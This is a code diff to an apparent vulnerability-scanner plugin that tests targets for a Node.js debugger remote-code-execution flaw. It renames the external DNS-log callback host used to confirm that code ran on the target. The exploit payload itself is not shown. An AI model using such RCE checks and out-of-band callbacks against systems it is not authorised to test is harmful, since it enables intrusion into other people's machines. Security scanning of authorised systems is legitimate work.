@@ -47,16 +47,18 @@ def random_str(length):
     return "".join(random.choice(pool) for _ in range(length))
 
 
-@is_port_open
-def verify(ip, port=80, name=None, timeout=10):
+# @is_port_open
+def verify(ip, port=80, name=None, timeout=10,types='ip'):
     info = {
         "url": "http://{}:{}".format(ip, port),
         "vuln_name": "nodejs debugger rce",
         "severity": "high",
         "proof": ""
     }
+    if types != 'ip':
+        return
     socket.setdefaulttimeout(timeout)
-    server = "devil.yoyostay.top"
+    server = "devil.dns.yoyostay.top"
     check_str = random_str(16)
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -67,7 +69,7 @@ def verify(ip, port=80, name=None, timeout=10):
         pass
     else:
         time.sleep(2)
-        info["proof"] = "{}.devil.yoyostay.top".format(check_str)
+        info["proof"] = "{}.devil.dns.yoyostay.top".format(check_str)
         if dnslog_check(check_str):
             return info
 
